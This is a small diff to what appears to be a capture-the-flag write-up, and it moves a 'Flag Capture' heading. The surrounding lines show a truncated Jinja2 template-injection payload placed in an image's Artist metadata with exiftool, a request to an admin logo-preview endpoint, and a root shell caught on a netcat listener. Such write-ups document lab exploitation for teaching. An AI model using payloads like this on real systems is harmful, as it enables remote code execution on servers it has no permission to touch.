@@ -249,9 +249,9 @@ exiftool -Artist='{{ self._TemplateReference__context.cycler.__init__.__globals_
 2. Triggered `/admin/logo_preview?file=shell.png`
 3. Received root shell on netcat listener
 
-### Step 6: Flag Capture
-
 ![Root Shell](images/rce_access.png) 
+
+### Step 6: Flag Capture
 
 ![Flag](images/flag.png)
 
